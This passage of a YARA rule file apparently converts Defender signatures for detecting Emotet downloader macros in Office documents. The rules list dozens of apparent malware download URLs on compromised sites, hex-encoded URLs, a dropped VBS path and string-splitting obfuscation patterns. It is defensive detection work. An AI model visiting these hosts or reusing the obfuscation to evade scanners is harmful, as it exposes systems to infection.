        $x_1_4 = {68 74 74 70 73 3a 2f 2f 73 63 68 77 69 7a 65 72 2e 6e 65 74 2f 73 74 79 6c 65 64 2f [0-47] 2f}  //weight: 1, accuracy: Low
        $x_1_5 = {68 74 74 70 3a 2f 2f 73 68 69 6d 61 6c 2e 61 74 77 65 62 70 61 67 65 73 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f [0-47] 2f}  //weight: 1, accuracy: Low
        $x_1_6 = {68 74 74 70 3a 2f 2f 6d 6f 76 65 69 74 2e 73 61 76 76 79 69 6e 74 2e 63 6f 6d 2f 63 6f 6e 66 69 67 2f [0-47] 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_DSM_2147813514_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.DSM!MTB"
        threat_id = "2147813514"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c:\\programdata\\etyockqw.vbs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDG_2147813983_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDG!MTB"
        threat_id = "2147813983"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://carretilha.net/whats/RSL50BlRP0a6hj/" ascii //weight: 1
        $x_1_2 = "://shrinandrajoverseas.com/old/wQXty0wnVDY/" ascii //weight: 1
        $x_1_3 = "://zionimoveis.com.br/wp-content/Bn00gaw/" ascii //weight: 1
        $x_1_4 = "://kontacsgo.pl/m/uwZYNUjGeWW/" ascii //weight: 1
        $x_1_5 = "://vps36153.publiccloud.com.br/wp-admin/RfAZZ776uMNhSpOT/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDH_2147813984_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDH!MTB"
        threat_id = "2147813984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://oroanddentalcarecenter.com/wp-includes/0JRI2sOVpNkDhAe/" ascii //weight: 1
        $x_1_2 = "://dev.subs2me.com/wp-includes/EMa/" ascii //weight: 1
        $x_1_3 = "://imagecarephotography.com/wp-includes/KVRvUyat0qqK0W/" ascii //weight: 1
        $x_1_4 = "://yanapiri.com/upeatv/9IZP9RfbH338pFPI/" ascii //weight: 1
        $x_1_5 = "://gurmitjaswal.ca/frer-hate/LW37erwSAhgU/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDI_2147814003_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDI!MTB"
        threat_id = "2147814003"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://nataliapereira.com/wp-admin/pE8xYY3x6p/" ascii //weight: 1
        $x_1_2 = "://annewelshsalon.com/wp-admin/2c9l2o1/cWWAzTVQ/" ascii //weight: 1
        $x_1_3 = "://hellocloudgurusgerald.com/wp-content/iXYx/" ascii //weight: 1
        $x_1_4 = "://ramijabali.com/licenses/" ascii //weight: 1
        $x_1_5 = "://africa-roadworks.com/lilo-bard/vk3GSY7/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDJ_2147814078_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDJ!MTB"
        threat_id = "2147814078"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://piajimenez.com/Fox-C/dS4nv3spYd0DZsnwLqov/" ascii //weight: 1
        $x_1_2 = "://inopra.com/wp-includes/3zGnQGNCvIKuvrO7T/" ascii //weight: 1
        $x_1_3 = "://biomedicalpharmaegypt.com/sapbush/BKEaVq1zoyJssmUoe/" ascii //weight: 1
        $x_1_4 = "://getlivetext.com/Pectinacea/AL5FVpjleCW/" ascii //weight: 1
        $x_1_5 = "://janshabd.com/Zgye2/" ascii //weight: 1
        $x_1_6 = "://justforanime.com/stratose/PonwPXCl/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDK_2147814109_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDK!MTB"
        threat_id = "2147814109"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://goglobetravel.com/wp-admin/1O1Tjr9nHBV/" ascii //weight: 1
        $x_1_2 = "://pakistannakliye.com/wp-admin/dyfAdRkv7/" ascii //weight: 1
        $x_1_3 = "://spinoffyarnshop.com/content/YQlmbLaB/" ascii //weight: 1
        $x_1_4 = "://murtjizindustry.com/wp-content/yI6/" ascii //weight: 1
        $x_1_5 = "://nazrultheking.com/wp-includes/LZ/" ascii //weight: 1
        $x_1_6 = "://hossaibmojammel.com/wp-content/qFPghprWO0ONxLFA5d/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDL_2147814153_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDL!MTB"
        threat_id = "2147814153"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://wellnessonus.com/wp-admin/OFq5F8Y/" ascii //weight: 1
        $x_1_2 = "://choicepestcontrol.xyz/wellknown/PERKnM4X/" ascii //weight: 1
        $x_1_3 = "://sse-studio.com/cq0xhpj/6pmmsaPCOGtG6/" ascii //weight: 1
        $x_1_4 = "://velasaromaticasonline.com/wp-admin/5Id5LqSb3O3BUM5Z/" ascii //weight: 1
        $x_1_5 = "://alonsoconsultancyservice.com/wp-content/0r7tMAnLfwKu0gvcH/" ascii //weight: 1
        $x_1_6 = "://trainingchallenges.xyz/wp-admin/ebPbsOdsRJA9G/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDM_2147814167_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDM!MTB"
        threat_id = "2147814167"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://foroviviendaparaguay.com/wp-admin/hx8U6XMffnkv8HI2Oig/" ascii //weight: 1
        $x_1_2 = "://en.pachammer.com/wp-content/vIG/" ascii //weight: 1
        $x_1_3 = "://ghsjalkherabsr.com/oz03n/6XeYLjFXcFE/" ascii //weight: 1
        $x_1_4 = "://ghsmadonabsr.com/wp-includes/Of4kQNCp2WLy0F4B/" ascii //weight: 1
        $x_1_5 = "://www.aacitygroup.com/wp-content/EkY9/" ascii //weight: 1
        $x_1_6 = "://theoutsourcedaccountant.com/images/nFikTQmP/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDN_2147814170_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDN!MTB"
        threat_id = "2147814170"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://rosywhitecleaningsolution.com/wp-admin/PqMw6fND8Bb1I4VPR10/" ascii //weight: 1
        $x_1_2 = "://havilaholuemglobal.com/dofz29/ymIfCcEL8I5kjA6E/" ascii //weight: 1
        $x_1_3 = "://www.floresguitarinstruction.com/wp-admin/jWlCX/" ascii //weight: 1
        $x_1_4 = "://www.drcc.co.za/restoredcontent/nAKvnbRpazx7c/" ascii //weight: 1
        $x_1_5 = "://aopda.org/wp-content/uploads/RDL75PME7OKHk4f/" ascii //weight: 1
        $x_1_6 = "://chera.co.kr/wp-includes/i2nnUkDXZ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDO_2147814177_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDO!MTB"
        threat_id = "2147814177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://moveconnects.com/nvclle7y/pD1vMMFRKS9wasA4E/" ascii //weight: 1
        $x_1_2 = "://totalplaytuxtla.com/sitio/tEMOwWRh/" ascii //weight: 1
        $x_1_3 = "://meca-global.com/wp-admin/zpM6L8KXY0H/" ascii //weight: 1
        $x_1_4 = "://ydxinzuo.cn/0gfwjgh/1sodbUEzYzTRyy/" ascii //weight: 1
        $x_1_5 = "://51.222.72.232/wp-includes/3ztqctcYr/" ascii //weight: 1
        $x_1_6 = "://51.222.72.233/wp-includes/Xi60QX9khe/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDP_2147814194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDP!MTB"
        threat_id = "2147814194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://techplanbd.xyz/qel424/RSz4/" ascii //weight: 1
        $x_1_2 = "://nuwayinternational.com/js/ELNnL0in5CbGnHmNc/" ascii //weight: 1
        $x_1_3 = "://crm.techopesolutions.com/tttwxore/ihzbh04dT0XaJGAf/" ascii //weight: 1
        $x_1_4 = "://steelcorp-fr.com/wp-content/tmMFW0SOgOjVCO/" ascii //weight: 1
        $x_1_5 = "://deine-bewerbung.com/wp-content/TKXpk/" ascii //weight: 1
        $x_1_6 = "://livejagat.com/h/L37tCM6ppS/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SST_2147814267_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SST!MTB"
        threat_id = "2147814267"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://janshabd.com/E33ZFv/" ascii //weight: 1
        $x_1_2 = "http://amorespasalon.com/wp-admin/ZsK0FbGGLqNpmzL/" ascii //weight: 1
        $x_1_3 = "http://vulkanvegasbonus.jeunete.com/wp-content/hAAFJQA1Bm/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDQ_2147814274_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDQ!MTB"
        threat_id = "2147814274"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://touqarrayan.com/wp-content/RoiB/" ascii //weight: 1
        $x_1_2 = "://nayzaqaljanoob-iq.com/sapbush/tylhe1/" ascii //weight: 1
        $x_1_3 = "://cabinet-bribech.com/wp/DyMNglRY5B4abPy1hH/" ascii //weight: 1
        $x_1_4 = "://retailhpsinterview.com/cgi-bin/dJp9RYh/" ascii //weight: 1
        $x_1_5 = "://lisalmcgee.com/images/xpl7i1ETzHPwaFd89HS/" ascii //weight: 1
        $x_1_6 = "://collision-staging.com/wp-content/94PQ1/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "http://henrysfreshroast.com/OevI7Yy0i6YShxFl/" ascii //weight: 2
        $x_2_2 = "http://www.ajaxmatters.com/c7g8t/nnzJJ1rKFD2P/" ascii //weight: 2
        $x_2_3 = "http://aopda.org/wp-content/uploads/5oTAVJyjDFOllX2uE/" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "gandhitoday.org/video/6JvA8/" ascii //weight: 1
        $x_1_2 = "djunreal.co.uk/site/ApOKpFad/" ascii //weight: 1
        $x_1_3 = "johnsonsmedia.it/img/ZBNk0xpRL8YEVl" ascii //weight: 1
        $x_1_4 = "genccagdas.com.tr/assets/doWHIxLe7e" ascii //weight: 1
        $x_1_5 = "grafischer.ch/fit-well/wDPTwKtZPoWL12/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://mymicrogreen.mightcode.com/Fox-C/hlHV/" ascii //weight: 1
        $x_1_2 = "://188.166.]245.112/template/Ryk/" ascii //weight: 1
        $x_1_3 = "://47.]244.189.]73/--/er2yA5LkRcXrT0Q/" ascii //weight: 1
        $x_1_4 = "://www.dnautik.com/wp-includes/vTARHRKHjRqkGKU/" ascii //weight: 1
        $x_1_5 = "://al-brik.com/vb/EBB7FuaWnJm/" ascii //weight: 1
        $x_1_6 = "://bulldogironworksllc.com/temp/6UyNu8/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://creemo.pl/wp-admin/ZKS1DcdquUT4Bb8Kb/" ascii //weight: 1
        $x_1_2 = "://filmmogzivota.rs/SpryAssets/gDR/" ascii //weight: 1
        $x_1_3 = "://demo34.ckg.hk/service/hhMZrfC7Mnm9JD/" ascii //weight: 1
        $x_1_4 = "://focusmedica.in/fmlib/IxBABMh0I2cLM3qq1GVv/" ascii //weight: 1
        $x_1_5 = "://cipro.mx/prensa/siZP69rBFmibDvuTP1L/" ascii //weight: 1
        $x_1_6 = "://colegiounamuno.es/cgi-bin/E/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/i\"&\"m\"&\"m\"&\"ob\"&\"ilg\"&\"olf\"&\"o.it/c\"&\"g\"&\"i-b\"&\"i\"&\"n/Uf\"&" ascii //weight: 1
        $x_1_2 = "t\"&\"t\"&\"p\"&\":/\"&\"/i\"&\"ls\"&\"ew\"&\"el\"&\"p.n\"&\"l/t\"&\"em\"&\"pl\"&\"at\"&\"es/c\"&\"9B\"&\"59\"&\"jP\"&\"7z\"&\"s/" ascii //weight: 1
        $x_1_3 = "t\"&\"t\"&\"p\"&\":/\"&\"/in\"&\"do\"&\"ne\"&\"si\"&\"aju\"&\"ar\"&\"a.a\"&\"si\"&\"a/w\"&\"p-c\"&\"on\"&\"te\"&\"n\"&\"t/x/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttps://hepsisifa.com/wp-admin/k/" ascii //weight: 1
        $x_1_2 = "ttp://filmmogzivota.rs/SpryAssets/or24hhBl2Ib8704SDO/" ascii //weight: 1
        $x_1_3 = "ttp://ecoarch.com.tw/cgi-bin/E/" ascii //weight: 1
        $x_1_4 = "ttps://www.clearconstruction.co.uk/scripts/Ev5IXoBvFJkBQ0MZXb/" ascii //weight: 1
        $x_1_5 = "ttps://galaxy-catering.com.vn/galxy/Fg1vvhlYJ/" ascii //weight: 1
        $x_1_6 = "ttp://www.hangaryapi.com.tr/wp-admin/5n42ncL3nWMbJHwy7/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttps://www.itesmeitic.com/term/IFjx5ElE0ldr8wDDHjub/" ascii //weight: 1
        $x_1_2 = "ttps://www.ingonherbal.com/application/PhEbceg4x/" ascii //weight: 1
        $x_1_3 = "ttp://ftp.colibriconstruction.net/cc/KHieqeOsagkmlGIuXc56/" ascii //weight: 1
        $x_1_4 = "ttp://commune-ariana.tn/sites/3BvaCmo/" ascii //weight: 1
        $x_1_5 = "ttp://dmaicinnovations.com/Swift-5.0.2/jEtePB/" ascii //weight: 1
        $x_1_6 = "ttps://drcreative.cz/images/DwThyQntyImCHk0tpba/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"ps:/\"&\"/b\"&\"vi\"&\"rt\"&\"ua\"&\"l.c\"&\"o\"&\"m/a\"&\"ff\"&\"in\"&\"it\"&\"a/r\"&\"yX\"&\"UZ\"&\"dA\"&\"Hc\"&\"NN\"&\"EG/" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"p\"&\"s:/\"&\"/bu\"&\"ll\"&\"do\"&\"gi\"&\"ro\"&\"nw\"&\"or\"&\"ks\"&\"ll\"&\"c.c\"&\"o\"&\"m/t\"&\"em\"&\"p/3\"&\"29\"&\"30\"&\"Ro\"&\"of\"&\"bd\"&\"mQ\"&\"0r" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps:/\"&\"/w\"&\"ww.a\"&\"lm\"&\"oe\"&\"qa\"&\"ta\"&\"r.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"in/q\"&\"oO\"&\"YP\"&\"hl\"&\"kR\"&\"Gn\"&\"BC\"&\"lm\"&\"Nu\"&\"5I/W" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"ps:/\"&\"/bo\"&\"sn\"&\"y.c\"&\"o\"&\"m/a\"&\"sp\"&\"ne\"&\"t_c\"&\"li\"&\"en\"&\"t/U\"&\"Zl\"&\"st\"&\"" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p:/\"&\"/mu\"&\"lm\"&\"at\"&\"do\"&\"l.c\"&\"o\"&\"m/a\"&\"d\"&\"m/S\"&\"em\"&\"rx\"&\"6p\"&\"Q/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSMK_2147814362_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSMK!MTB"
        threat_id = "2147814362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"p:/\"&\"/do\"&\"u\"&\"g\"&\"ve\"&\"ed\"&\"er.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/xJ\"&\"91\"&\"Zt\"&\"tG\"&\"Ri\"&\"oQ\"&\"7I\"&\"UL/" ascii //weight: 1
        $x_1_2 = "h\"&\"ttp\"&\"s:/\"&\"/e-fi\"&\"st\"&\"ik.c\"&\"o\"&\"m/a\"&\"ja\"&\"x/P\"&\"nA" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"p:/\"&\"/ds\"&\"in\"&\"fo\"&\"rm\"&\"at\"&\"ic\"&\"o\"&\"s.c\"&\"o\"&\"m/_p\"&\"ri\"&\"va\"&\"te/f\"&\"36\"&\"Yl" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"p:/\"&\"/ds\"&\"tn\"&\"y.n\"&\"e\"&\"t/c\"&\"g\"&\"i-b\"&\"i\"&\"n/P\"&\"Oq\"&\"JK\"&\"cx\"&\"iI\"&\"zR\"&\"b" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"p:/\"&\"/fa\"&\"ke\"&\"ci\"&\"ty.n\"&\"e\"&\"t/c\"&\"ac\"&\"he/X\"&\"tI\"&\"zh\"&\"yL\"&\"Eo\"&\"LI" ascii //weight: 1
        $x_1_6 = "h\"&\"tt\"&\"p:/\"&\"/fa\"&\"ye\"&\"sc\"&\"hm\"&\"id\"&\"t.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/Q\"&\"8p\"&\"j" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDU_2147814509_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDU!MTB"
        threat_id = "2147814509"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://edicatiefarahotare.royalwebhosting.net/8Q33O8v63Ei2h2g/" ascii //weight: 1
        $x_1_2 = "://estetaaaaa.125mb.com/admin/IE5zu5A9ly/" ascii //weight: 1
        $x_1_3 = "://fasovitrine.com/wp-admin/5EhPJ14tOSzT/" ascii //weight: 1
        $x_1_4 = "://gaddco.com/cgi-bin/sARa39due/" ascii //weight: 1
        $x_1_5 = "://www.hih7.com/wp-admin/EQZYT/" ascii //weight: 1
        $x_1_6 = "://www.yesdeko.com/be/6yhOfqLH2NMVtUQuPYD/" ascii //weight: 1
        $x_1_7 = "://jonaloredo.com/inc/G6mr1U5rfD7XeX/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDV_2147814591_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDV!MTB"
        threat_id = "2147814591"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://matskigroup.com/wp-admin/nqGatgYyNskXXqEnJw/" ascii //weight: 1
        $x_1_2 = "://safecampus.net/wp-includes/YUeG3uumtePP/" ascii //weight: 1
        $x_1_3 = "://akbakan.com/aQonQ0Rc/" ascii //weight: 1
